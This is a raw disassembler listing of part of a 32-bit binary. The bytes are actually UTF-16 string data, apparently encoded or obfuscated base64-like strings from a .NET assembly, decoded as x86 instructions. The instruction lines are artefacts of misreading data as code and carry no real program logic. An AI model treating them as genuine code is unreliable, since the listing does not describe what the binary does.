10003b84:	6e                   	outsb  %ds:(%esi),(%dx)
10003b85:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
10003b89:	00 4e 00             	add    %cl,0x0(%esi)
10003b8c:	6a 00                	push   $0x0
10003b8e:	56                   	push   %esi
10003b8f:	00 30                	add    %dh,(%eax)
10003b91:	00 39                	add    %bh,(%ecx)
10003b93:	00 68 00             	add    %ch,0x0(%eax)
10003b96:	5a                   	pop    %edx
10003b97:	00 6b 00             	add    %ch,0x0(%ebx)
10003b9a:	46                   	inc    %esi
10003b9b:	00 30                	add    %dh,(%eax)
10003b9d:	00 5a 00             	add    %bl,0x0(%edx)
10003ba0:	30 00                	xor    %al,(%eax)
10003ba2:	30 00                	xor    %al,(%eax)
10003ba4:	7a 00                	jp     0x10003ba6
10003ba6:	57                   	push   %edi
10003ba7:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
10003bab:	00 4e 00             	add    %cl,0x0(%esi)
10003bae:	59                   	pop    %ecx
10003baf:	00 31                	add    %dh,(%ecx)
10003bb1:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
10003bb5:	00 59 00             	add    %bl,0x0(%ecx)
10003bb8:	57                   	push   %edi
10003bb9:	00 5a 00             	add    %bl,0x0(%edx)
10003bbc:	42                   	inc    %edx
10003bbd:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
10003bc1:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
10003bc5:	00 4d 00             	add    %cl,0x0(%ebp)
10003bc8:	32 00                	xor    (%eax),%al
10003bca:	4e                   	dec    %esi
10003bcb:	00 58 00             	add    %bl,0x0(%eax)
10003bce:	54                   	push   %esp
10003bcf:	00 32                	add    %dh,(%edx)
10003bd1:	00 46 00             	add    %al,0x0(%esi)
10003bd4:	6d                   	insl   (%dx),%es:(%edi)
10003bd5:	00 51 00             	add    %dl,0x0(%ecx)
10003bd8:	58                   	pop    %eax
10003bd9:	00 52 00             	add    %dl,0x0(%edx)
10003bdc:	6e                   	outsb  %ds:(%esi),(%dx)
10003bdd:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
10003be1:	00 4e 00             	add    %cl,0x0(%esi)
10003be4:	6e                   	outsb  %ds:(%esi),(%dx)
10003be5:	00 5a 00             	add    %bl,0x0(%edx)
10003be8:	45                   	inc    %ebp
10003be9:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
10003bed:	00 56 00             	add    %dl,0x0(%esi)
10003bf0:	30 00                	xor    %al,(%eax)
10003bf2:	39 00                	cmp    %eax,(%eax)
10003bf4:	68 00 5a 00 6b       	push   $0x6b005a00
10003bf9:	00 46 00             	add    %al,0x0(%esi)
10003bfc:	30 00                	xor    %al,(%eax)
10003bfe:	5a                   	pop    %edx
10003bff:	00 30                	add    %dh,(%eax)
10003c01:	00 30                	add    %dh,(%eax)
10003c03:	00 7a 00             	add    %bh,0x0(%edx)
10003c06:	59                   	pop    %ecx
10003c07:	00 31                	add    %dh,(%ecx)
10003c09:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
10003c0d:	00 59 00             	add    %bl,0x0(%ecx)
10003c10:	57                   	push   %edi
10003c11:	00 5a 00             	add    %bl,0x0(%edx)
10003c14:	42                   	inc    %edx
10003c15:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
10003c19:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
10003c1d:	00 4d 00             	add    %cl,0x0(%ebp)
10003c20:	7a 00                	jp     0x10003c22
10003c22:	68 00 6e 00 59       	push   $0x59006e00
10003c27:	00 32                	add    %dh,(%edx)
10003c29:	00 4e 00             	add    %cl,0x0(%esi)
10003c2c:	58                   	pop    %eax
10003c2d:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
10003c31:	00 46 00             	add    %al,0x0(%esi)
10003c34:	6d                   	insl   (%dx),%es:(%edi)
10003c35:	00 51 00             	add    %dl,0x0(%ecx)
10003c38:	58                   	pop    %eax
10003c39:	00 52 00             	add    %dl,0x0(%edx)
10003c3c:	6e                   	outsb  %ds:(%esi),(%dx)
10003c3d:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
10003c41:	00 4e 00             	add    %cl,0x0(%esi)
10003c44:	6a 00                	push   $0x0
10003c46:	56                   	push   %esi
10003c47:	00 30                	add    %dh,(%eax)
10003c49:	00 39                	add    %bh,(%ecx)
10003c4b:	00 68 00             	add    %ch,0x0(%eax)
10003c4e:	5a                   	pop    %edx
10003c4f:	00 6b 00             	add    %ch,0x0(%ebx)
10003c52:	46                   	inc    %esi
10003c53:	00 30                	add    %dh,(%eax)
10003c55:	00 5a 00             	add    %bl,0x0(%edx)
10003c58:	30 00                	xor    %al,(%eax)
10003c5a:	30 00                	xor    %al,(%eax)
10003c5c:	7a 00                	jp     0x10003c5e
10003c5e:	53                   	push   %ebx
10003c5f:	00 45 00             	add    %al,0x0(%ebp)
10003c62:	70 00                	jo     0x10003c64
10003c64:	32 00                	xor    (%eax),%al
10003c66:	59                   	pop    %ecx
10003c67:	00 31                	add    %dh,(%ecx)
10003c69:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
10003c6d:	00 59 00             	add    %bl,0x0(%ecx)
10003c70:	57                   	push   %edi
10003c71:	00 5a 00             	add    %bl,0x0(%edx)
10003c74:	42                   	inc    %edx
10003c75:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
10003c79:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
10003c7d:	00 4d 00             	add    %cl,0x0(%ebp)
10003c80:	32 00                	xor    (%eax),%al
10003c82:	4e                   	dec    %esi
10003c83:	00 58 00             	add    %bl,0x0(%eax)
10003c86:	54                   	push   %esp
10003c87:	00 32                	add    %dh,(%edx)
10003c89:	00 46 00             	add    %al,0x0(%esi)
10003c8c:	6d                   	insl   (%dx),%es:(%edi)
10003c8d:	00 51 00             	add    %dl,0x0(%ecx)
10003c90:	58                   	pop    %eax
10003c91:	00 52 00             	add    %dl,0x0(%edx)
10003c94:	6e                   	outsb  %ds:(%esi),(%dx)
10003c95:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
10003c99:	00 4e 00             	add    %cl,0x0(%esi)
10003c9c:	5a                   	pop    %edx
10003c9d:	00 4d 00             	add    %cl,0x0(%ebp)
10003ca0:	6c                   	insb   (%dx),%es:(%edi)
10003ca1:	00 5a 00             	add    %bl,0x0(%edx)
10003ca4:	6a 00                	push   $0x0
10003ca6:	56                   	push   %esi
10003ca7:	00 30                	add    %dh,(%eax)
10003ca9:	00 39                	add    %bh,(%ecx)
10003cab:	00 68 00             	add    %ch,0x0(%eax)
10003cae:	5a                   	pop    %edx
10003caf:	00 6b 00             	add    %ch,0x0(%ebx)
10003cb2:	46                   	inc    %esi
10003cb3:	00 30                	add    %dh,(%eax)
10003cb5:	00 5a 00             	add    %bl,0x0(%edx)
10003cb8:	30 00                	xor    %al,(%eax)
10003cba:	30 00                	xor    %al,(%eax)
10003cbc:	7a 00                	jp     0x10003cbe
10003cbe:	59                   	pop    %ecx
10003cbf:	00 31                	add    %dh,(%ecx)
10003cc1:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
10003cc5:	00 59 00             	add    %bl,0x0(%ecx)
10003cc8:	57                   	push   %edi
10003cc9:	00 5a 00             	add    %bl,0x0(%edx)
10003ccc:	42                   	inc    %edx
10003ccd:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
10003cd1:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
10003cd5:	00 4d 00             	add    %cl,0x0(%ebp)
10003cd8:	33 00                	xor    (%eax),%eax
10003cda:	70 00                	jo     0x10003cdc
10003cdc:	6a 00                	push   $0x0
10003cde:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
10003ce2:	4e                   	dec    %esi
10003ce3:	00 58 00             	add    %bl,0x0(%eax)
10003ce6:	54                   	push   %esp
10003ce7:	00 32                	add    %dh,(%edx)
10003ce9:	00 46 00             	add    %al,0x0(%esi)
10003cec:	6d                   	insl   (%dx),%es:(%edi)
10003ced:	00 51 00             	add    %dl,0x0(%ecx)
10003cf0:	58                   	pop    %eax
10003cf1:	00 52 00             	add    %dl,0x0(%edx)
10003cf4:	6e                   	outsb  %ds:(%esi),(%dx)
10003cf5:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
10003cf9:	00 4e 00             	add    %cl,0x0(%esi)
10003cfc:	6a 00                	push   $0x0
10003cfe:	56                   	push   %esi
10003cff:	00 30                	add    %dh,(%eax)
10003d01:	00 39                	add    %bh,(%ecx)
10003d03:	00 68 00             	add    %ch,0x0(%eax)
10003d06:	5a                   	pop    %edx
10003d07:	00 6b 00             	add    %ch,0x0(%ebx)
10003d0a:	46                   	inc    %esi
10003d0b:	00 30                	add    %dh,(%eax)
10003d0d:	00 5a 00             	add    %bl,0x0(%edx)
10003d10:	30 00                	xor    %al,(%eax)
10003d12:	30 00                	xor    %al,(%eax)
10003d14:	7a 00                	jp     0x10003d16
10003d16:	51                   	push   %ecx
10003d17:	00 6e 00             	add    %ch,0x0(%esi)
10003d1a:	52                   	push   %edx
10003d1b:	00 61 00             	add    %ah,0x0(%ecx)
10003d1e:	59                   	pop    %ecx
10003d1f:	00 31                	add    %dh,(%ecx)
10003d21:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
10003d25:	00 59 00             	add    %bl,0x0(%ecx)
10003d28:	57                   	push   %edi
10003d29:	00 5a 00             	add    %bl,0x0(%edx)
10003d2c:	42                   	inc    %edx
10003d2d:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
10003d31:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
10003d35:	00 4d 00             	add    %cl,0x0(%ebp)
10003d38:	32 00                	xor    (%eax),%al
10003d3a:	4e                   	dec    %esi
10003d3b:	00 58 00             	add    %bl,0x0(%eax)
10003d3e:	54                   	push   %esp
10003d3f:	00 32                	add    %dh,(%edx)
10003d41:	00 46 00             	add    %al,0x0(%esi)
10003d44:	6d                   	insl   (%dx),%es:(%edi)
10003d45:	00 51 00             	add    %dl,0x0(%ecx)
10003d48:	58                   	pop    %eax
10003d49:	00 52 00             	add    %dl,0x0(%edx)
10003d4c:	6e                   	outsb  %ds:(%esi),(%dx)
10003d4d:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
10003d51:	00 4e 00             	add    %cl,0x0(%esi)
10003d54:	58                   	pop    %eax
10003d55:	00 4d 00             	add    %cl,0x0(%ebp)
10003d58:	58                   	pop    %eax
10003d59:	00 5a 00             	add    %bl,0x0(%edx)
10003d5c:	6a 00                	push   $0x0
10003d5e:	56                   	push   %esi
10003d5f:	00 30                	add    %dh,(%eax)
10003d61:	00 39                	add    %bh,(%ecx)
10003d63:	00 68 00             	add    %ch,0x0(%eax)
10003d66:	5a                   	pop    %edx
10003d67:	00 6b 00             	add    %ch,0x0(%ebx)
10003d6a:	46                   	inc    %esi
10003d6b:	00 30                	add    %dh,(%eax)
10003d6d:	00 5a 00             	add    %bl,0x0(%edx)
10003d70:	30 00                	xor    %al,(%eax)
10003d72:	30 00                	xor    %al,(%eax)
10003d74:	7a 00                	jp     0x10003d76
10003d76:	59                   	pop    %ecx
10003d77:	00 31                	add    %dh,(%ecx)
10003d79:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
10003d7d:	00 59 00             	add    %bl,0x0(%ecx)
10003d80:	57                   	push   %edi
10003d81:	00 5a 00             	add    %bl,0x0(%edx)
10003d84:	42                   	inc    %edx
10003d85:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
10003d89:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
10003d8d:	00 4d 00             	add    %cl,0x0(%ebp)
10003d90:	32 00                	xor    (%eax),%al
10003d92:	4e                   	dec    %esi
10003d93:	00 75 00             	add    %dh,0x0(%ebp)
10003d96:	61                   	popa
10003d97:	00 32                	add    %dh,(%edx)
10003d99:	00 4e 00             	add    %cl,0x0(%esi)
10003d9c:	58                   	pop    %eax
10003d9d:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
10003da1:	00 46 00             	add    %al,0x0(%esi)
10003da4:	6d                   	insl   (%dx),%es:(%edi)
10003da5:	00 51 00             	add    %dl,0x0(%ecx)
10003da8:	58                   	pop    %eax
10003da9:	00 52 00             	add    %dl,0x0(%edx)
10003dac:	6e                   	outsb  %ds:(%esi),(%dx)
10003dad:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
10003db1:	00 4e 00             	add    %cl,0x0(%esi)
10003db4:	6a 00                	push   $0x0
10003db6:	56                   	push   %esi
10003db7:	00 30                	add    %dh,(%eax)
10003db9:	00 39                	add    %bh,(%ecx)
10003dbb:	00 68 00             	add    %ch,0x0(%eax)
10003dbe:	5a                   	pop    %edx
10003dbf:	00 6b 00             	add    %ch,0x0(%ebx)
10003dc2:	46                   	inc    %esi
10003dc3:	00 30                	add    %dh,(%eax)
10003dc5:	00 5a 00             	add    %bl,0x0(%edx)
10003dc8:	30 00                	xor    %al,(%eax)
10003dca:	30 00                	xor    %al,(%eax)
10003dcc:	7a 00                	jp     0x10003dce
10003dce:	50                   	push   %eax
10003dcf:	00 57 00             	add    %dl,0x0(%edi)
10003dd2:	4e                   	dec    %esi
10003dd3:	00 58 00             	add    %bl,0x0(%eax)
10003dd6:	54                   	push   %esp
10003dd7:	00 32                	add    %dh,(%edx)
10003dd9:	00 46 00             	add    %al,0x0(%esi)
10003ddc:	6d                   	insl   (%dx),%es:(%edi)
10003ddd:	00 51 00             	add    %dl,0x0(%ecx)
10003de0:	58                   	pop    %eax
10003de1:	00 52 00             	add    %dl,0x0(%edx)
10003de4:	6e                   	outsb  %ds:(%esi),(%dx)
10003de5:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
10003de9:	00 4d 00             	add    %cl,0x0(%ebp)
10003dec:	3d 00 00 15 63       	cmp    $0x63150000,%eax
10003df1:	00 57 00             	add    %dl,0x0(%edi)
10003df4:	4f                   	dec    %edi
10003df5:	00 61 00             	add    %ah,0x0(%ecx)
10003df8:	66 00 41 00          	data16 add %al,0x0(%ecx)
10003dfc:	74 00                	je     0x10003dfe
10003dfe:	67 00 4d 00          	add    %cl,0x0(%di)
10003e02:	33 00                	xor    (%eax),%eax
10003e04:	00 81 b1 4e 00 6d    	add    %al,0x6d004eb1(%ecx)
10003e0a:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
10003e0e:	00 5a 00             	add    %bl,0x0(%edx)
10003e11:	56                   	push   %esi
10003e12:	00 64 00 48          	add    %ah,0x48(%eax,%eax,1)
10003e16:	00 54 00 47          	add    %dl,0x47(%eax,%eax,1)
10003e1a:	00 6b 00             	add    %ch,0x0(%ebx)
10003e1d:	33 00                	xor    (%eax),%eax
10003e1f:	52                   	push   %edx
10003e20:	00 46 00             	add    %al,0x0(%esi)
10003e23:	6c                   	insb   (%dx),%es:(%edi)
10003e24:	00 59 00             	add    %bl,0x0(%ecx)
10003e27:	54                   	push   %esp
10003e28:	00 6a 00             	add    %ch,0x0(%edx)
10003e2b:	5a                   	pop    %edx
10003e2c:	00 6e 00             	add    %ch,0x0(%esi)
10003e2f:	63 00                	arpl   %eax,(%eax)
10003e31:	6d                   	insl   (%dx),%es:(%edi)
10003e32:	00 56 00             	add    %dl,0x0(%esi)
10003e35:	58                   	pop    %eax
10003e36:	00 52 00             	add    %dl,0x0(%edx)
10003e39:	30 00                	xor    %al,(%eax)
10003e3b:	78 00                	js     0x10003e3d
10003e3d:	70 00                	jo     0x10003e3f
10003e3f:	4e                   	dec    %esi
10003e40:	00 30                	add    %dh,(%eax)
10003e42:	00 51 00             	add    %dl,0x0(%ecx)
10003e45:	32 00                	xor    (%eax),%al
10003e47:	5a                   	pop    %edx
10003e48:	00 33                	add    %dh,(%ebx)
10003e4a:	00 4a 00             	add    %cl,0x0(%edx)
10003e4d:	6c                   	insb   (%dx),%es:(%edi)
10003e4e:	00 56 00             	add    %dl,0x0(%esi)
10003e51:	30 00                	xor    %al,(%eax)
10003e53:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
10003e57:	61                   	popa
10003e58:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
10003e5c:	00 45 00             	add    %al,0x0(%ebp)
10003e5f:	64 00 32             	add    %dh,%fs:(%edx)
10003e62:	00 4a 00             	add    %cl,0x0(%edx)
10003e65:	74 00                	je     0x10003e67
10003e67:	4e                   	dec    %esi
10003e68:	00 6d 00             	add    %ch,0x0(%ebp)
10003e6b:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
10003e6f:	5a                   	pop    %edx
10003e70:	00 56 00             	add    %dl,0x0(%esi)
10003e73:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
10003e77:	54                   	push   %esp
10003e78:	00 47 00             	add    %al,0x0(%edi)
10003e7b:	6b 00 33             	imul   $0x33,(%eax),%eax
10003e7e:	00 52 00             	add    %dl,0x0(%edx)
10003e81:	44                   	inc    %esp
10003e82:	00 5a 00             	add    %bl,0x0(%edx)
10003e85:	6e                   	outsb  %ds:(%esi),(%dx)
10003e86:	00 63 00             	add    %ah,0x0(%ebx)
10003e89:	6d                   	insl   (%dx),%es:(%edi)
10003e8a:	00 56 00             	add    %dl,0x0(%esi)
10003e8d:	58                   	pop    %eax
10003e8e:	00 52 00             	add    %dl,0x0(%edx)
10003e91:	30 00                	xor    %al,(%eax)
10003e93:	78 00                	js     0x10003e95
10003e95:	70 00                	jo     0x10003e97
10003e97:	4e                   	dec    %esi
10003e98:	00 30                	add    %dh,(%eax)
10003e9a:	00 52 00             	add    %dl,0x0(%edx)
10003e9d:	57                   	push   %edi
10003e9e:	00 4d 00             	add    %cl,0x0(%ebp)
10003ea1:	46                   	inc    %esi
10003ea2:	00 67 00             	add    %ah,0x0(%edi)
10003ea5:	32 00                	xor    (%eax),%al
10003ea7:	5a                   	pop    %edx
10003ea8:	00 33                	add    %dh,(%ebx)
10003eaa:	00 4a 00             	add    %cl,0x0(%edx)
10003ead:	6c                   	insb   (%dx),%es:(%edi)
10003eae:	00 56 00             	add    %dl,0x0(%esi)
10003eb1:	30 00                	xor    %al,(%eax)
10003eb3:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
10003eb7:	61                   	popa
10003eb8:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
10003ebc:	00 45 00             	add    %al,0x0(%ebp)
10003ebf:	4e                   	dec    %esi
10003ec0:	00 6d 00             	add    %ch,0x0(%ebp)
10003ec3:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
10003ec7:	5a                   	pop    %edx
10003ec8:	00 56 00             	add    %dl,0x0(%esi)
10003ecb:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
10003ecf:	54                   	push   %esp
10003ed0:	00 47 00             	add    %al,0x0(%edi)
10003ed3:	6b 00 33             	imul   $0x33,(%eax),%eax
10003ed6:	00 52 00             	add    %dl,0x0(%edx)
10003ed9:	44                   	inc    %esp
10003eda:	00 4e 00             	add    %cl,0x0(%esi)
10003edd:	4b                   	dec    %ebx
10003ede:	00 62 00             	add    %ah,0x0(%edx)
10003ee1:	44                   	inc    %esp
10003ee2:	00 5a 00             	add    %bl,0x0(%edx)
10003ee5:	6e                   	outsb  %ds:(%esi),(%dx)
10003ee6:	00 63 00             	add    %ah,0x0(%ebx)
10003ee9:	6d                   	insl   (%dx),%es:(%edi)
10003eea:	00 56 00             	add    %dl,0x0(%esi)
10003eed:	58                   	pop    %eax
10003eee:	00 52 00             	add    %dl,0x0(%edx)
10003ef1:	30 00                	xor    %al,(%eax)
10003ef3:	78 00                	js     0x10003ef5
10003ef5:	70 00                	jo     0x10003ef7
10003ef7:	4e                   	dec    %esi
10003ef8:	00 30                	add    %dh,(%eax)
10003efa:	00 51 00             	add    %dl,0x0(%ecx)
10003efd:	32 00                	xor    (%eax),%al
10003eff:	5a                   	pop    %edx
10003f00:	00 33                	add    %dh,(%ebx)
10003f02:	00 4a 00             	add    %cl,0x0(%edx)
10003f05:	6c                   	insb   (%dx),%es:(%edi)
10003f06:	00 56 00             	add    %dl,0x0(%esi)
10003f09:	30 00                	xor    %al,(%eax)
10003f0b:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
10003f0f:	61                   	popa
10003f10:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
10003f14:	00 45 00             	add    %al,0x0(%ebp)
10003f17:	57                   	push   %edi
10003f18:	00 6a 00             	add    %ch,0x0(%edx)
10003f1b:	4e                   	dec    %esi
10003f1c:	00 4f 00             	add    %cl,0x0(%edi)
10003f1f:	4e                   	dec    %esi
10003f20:	00 6d 00             	add    %ch,0x0(%ebp)
10003f23:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
10003f27:	5a                   	pop    %edx
10003f28:	00 56 00             	add    %dl,0x0(%esi)
10003f2b:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
10003f2f:	54                   	push   %esp
10003f30:	00 47 00             	add    %al,0x0(%edi)
10003f33:	6b 00 33             	imul   $0x33,(%eax),%eax
10003f36:	00 52 00             	add    %dl,0x0(%edx)
10003f39:	44                   	inc    %esp
10003f3a:	00 5a 00             	add    %bl,0x0(%edx)
10003f3d:	6e                   	outsb  %ds:(%esi),(%dx)
10003f3e:	00 63 00             	add    %ah,0x0(%ebx)
10003f41:	6d                   	insl   (%dx),%es:(%edi)
10003f42:	00 56 00             	add    %dl,0x0(%esi)
10003f45:	58                   	pop    %eax
10003f46:	00 52 00             	add    %dl,0x0(%edx)
10003f49:	30 00                	xor    %al,(%eax)
10003f4b:	78 00                	js     0x10003f4d
10003f4d:	70 00                	jo     0x10003f4f
10003f4f:	4e                   	dec    %esi
10003f50:	00 30                	add    %dh,(%eax)
10003f52:	00 52 00             	add    %dl,0x0(%edx)
10003f55:	34 00                	xor    $0x0,%al
10003f57:	59                   	pop    %ecx
10003f58:	00 6b 00             	add    %ch,0x0(%ebx)
10003f5b:	45                   	inc    %ebp
10003f5c:	00 32                	add    %dh,(%edx)
10003f5e:	00 5a 00             	add    %bl,0x0(%edx)
10003f61:	33 00                	xor    (%eax),%eax
10003f63:	4a                   	dec    %edx
10003f64:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
10003f68:	00 30                	add    %dh,(%eax)
10003f6a:	00 64 00 4d          	add    %ah,0x4d(%eax,%eax,1)
10003f6e:	00 61 00             	add    %ah,0x0(%ecx)
10003f71:	54                   	push   %esp
10003f72:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
10003f76:	00 4e 00             	add    %cl,0x0(%esi)
10003f79:	6d                   	insl   (%dx),%es:(%edi)
10003f7a:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
10003f7e:	00 5a 00             	add    %bl,0x0(%edx)
10003f81:	56                   	push   %esi
10003f82:	00 64 00 48          	add    %ah,0x48(%eax,%eax,1)
10003f86:	00 54 00 47          	add    %dl,0x47(%eax,%eax,1)
10003f8a:	00 6b 00             	add    %ch,0x0(%ebx)
10003f8d:	33 00                	xor    (%eax),%eax
10003f8f:	52                   	push   %edx
10003f90:	00 44 00 30          	add    %al,0x30(%eax,%eax,1)
10003f94:	00 39                	add    %bh,(%ecx)
10003f96:	00 4e 00             	add    %cl,0x0(%esi)
10003f99:	6d                   	insl   (%dx),%es:(%edi)
10003f9a:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
10003f9e:	00 5a 00             	add    %bl,0x0(%edx)
10003fa1:	56                   	push   %esi
10003fa2:	00 64 00 48          	add    %ah,0x48(%eax,%eax,1)
10003fa6:	00 54 00 47          	add    %dl,0x47(%eax,%eax,1)
10003faa:	00 6b 00             	add    %ch,0x0(%ebx)
10003fad:	33 00                	xor    (%eax),%eax
10003faf:	52                   	push   %edx
10003fb0:	00 41 00             	add    %al,0x0(%ecx)
10003fb3:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
10003fb8:	15 36 00 67 00       	adc    $0x670036,%eax
10003fbd:	72 00                	jb     0x10003fbf
10003fbf:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
10003fc3:	47                   	inc    %edi
10003fc4:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
10003fc8:	00 37                	add    %dh,(%edi)
10003fca:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
10003fce:	81 b1 53 00 6b 00 68 	xorl   $0x320068,0x6b0053(%ecx)
10003fd5:	00 32 00 
10003fd8:	53                   	push   %ebx
10003fd9:	00 47 00             	add    %al,0x0(%edi)
10003fdc:	6c                   	insb   (%dx),%es:(%edi)
10003fdd:	00 34 00             	add    %dh,(%eax,%eax,1)
10003fe0:	54                   	push   %esp
10003fe1:	00 48 00             	add    %cl,0x0(%eax)
10003fe4:	4e                   	dec    %esi
10003fe5:	00 34 00             	add    %dh,(%eax,%eax,1)
10003fe8:	55                   	push   %ebp
10003fe9:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
10003fed:	00 59 00             	add    %bl,0x0(%ecx)
10003ff0:	54                   	push   %esp
10003ff1:	00 6b 00             	add    %ch,0x0(%ebx)
10003ff4:	70 00                	jo     0x10003ff6
10003ff6:	49                   	dec    %ecx
10003ff7:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
10003ffb:	00 68 00             	add    %ch,0x0(%eax)
10003ffe:	70 00                	jo     0x10004000
10004000:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
10004004:	78 00                	js     0x10004006
10004006:	7a 00                	jp     0x10004008
10004008:	65 00 46 00          	add    %al,%gs:0x0(%esi)
1000400c:	4a                   	dec    %edx
1000400d:	00 4b 00             	add    %cl,0x0(%ebx)
10004010:	53                   	push   %ebx
10004011:	00 48 00             	add    %cl,0x0(%eax)
10004014:	5a                   	pop    %edx
10004015:	00 49 00             	add    %cl,0x0(%ecx)
10004018:	61                   	popa
10004019:	00 58 00             	add    %bl,0x0(%eax)
1000401c:	68 00 4d 00 63       	push   $0x63004d00
10004021:	00 33                	add    %dh,(%ebx)
10004023:	00 68 00             	add    %ch,0x0(%eax)
10004026:	53                   	push   %ebx
10004027:	00 64 00 32          	add    %ah,0x32(%eax,%eax,1)
1000402b:	00 4a 00             	add    %cl,0x0(%edx)
1000402e:	74 00                	je     0x10004030
10004030:	53                   	push   %ebx
10004031:	00 6b 00             	add    %ch,0x0(%ebx)
10004034:	68 00 32 00 53       	push   $0x53003200
10004039:	00 47 00             	add    %al,0x0(%edi)
1000403c:	6c                   	insb   (%dx),%es:(%edi)
1000403d:	00 34 00             	add    %dh,(%eax,%eax,1)
10004040:	54                   	push   %esp
10004041:	00 48 00             	add    %cl,0x0(%eax)
10004044:	4e                   	dec    %esi
10004045:	00 34 00             	add    %dh,(%eax,%eax,1)
10004048:	55                   	push   %ebp
10004049:	00 6b 00             	add    %ch,0x0(%ebx)
1000404c:	70 00                	jo     0x1000404e
1000404e:	49                   	dec    %ecx
1000404f:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
10004053:	00 68 00             	add    %ch,0x0(%eax)
10004056:	70 00                	jo     0x10004058
10004058:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
1000405c:	78 00                	js     0x1000405e
1000405e:	7a 00                	jp     0x10004060
10004060:	65 00 46 00          	add    %al,%gs:0x0(%esi)
10004064:	4a                   	dec    %edx
10004065:	00 57 00             	add    %dl,0x0(%edi)
10004068:	4d                   	dec    %ebp
10004069:	00 46 00             	add    %al,0x0(%esi)
1000406c:	68 00 4b 00 53       	push   $0x53004b00
10004071:	00 48 00             	add    %cl,0x0(%eax)
10004074:	5a                   	pop    %edx
10004075:	00 49 00             	add    %cl,0x0(%ecx)
10004078:	61                   	popa
10004079:	00 58 00             	add    %bl,0x0(%eax)
1000407c:	68 00 4d 00 63       	push   $0x63004d00
10004081:	00 33                	add    %dh,(%ebx)
10004083:	00 68 00             	add    %ch,0x0(%eax)
10004086:	53                   	push   %ebx
10004087:	00 53 00             	add    %dl,0x0(%ebx)
1000408a:	6b 00 68             	imul   $0x68,(%eax),%eax
1000408d:	00 32                	add    %dh,(%edx)
1000408f:	00 53 00             	add    %dl,0x0(%ebx)
10004092:	47                   	inc    %edi
10004093:	00 6c 00 34          	add    %ch,0x34(%eax,%eax,1)
10004097:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
1000409b:	00 4e 00             	add    %cl,0x0(%esi)
1000409e:	34 00                	xor    $0x0,%al
100040a0:	55                   	push   %ebp
100040a1:	00 6a 00             	add    %ch,0x0(%edx)
100040a4:	4a                   	dec    %edx
100040a5:	00 4f 00             	add    %cl,0x0(%edi)
100040a8:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
100040ac:	70 00                	jo     0x100040ae
100040ae:	49                   	dec    %ecx
100040af:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
100040b3:	00 68 00             	add    %ch,0x0(%eax)
100040b6:	70 00                	jo     0x100040b8
100040b8:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
100040bc:	78 00                	js     0x100040be
100040be:	7a 00                	jp     0x100040c0
100040c0:	65 00 46 00          	add    %al,%gs:0x0(%esi)
100040c4:	4a                   	dec    %edx
100040c5:	00 4b 00             	add    %cl,0x0(%ebx)
100040c8:	53                   	push   %ebx
100040c9:	00 48 00             	add    %cl,0x0(%eax)
100040cc:	5a                   	pop    %edx
100040cd:	00 49 00             	add    %cl,0x0(%ecx)
100040d0:	61                   	popa
100040d1:	00 58 00             	add    %bl,0x0(%eax)
100040d4:	68 00 4d 00 63       	push   $0x63004d00
100040d9:	00 33                	add    %dh,(%ebx)
100040db:	00 68 00             	add    %ch,0x0(%eax)
100040de:	53                   	push   %ebx
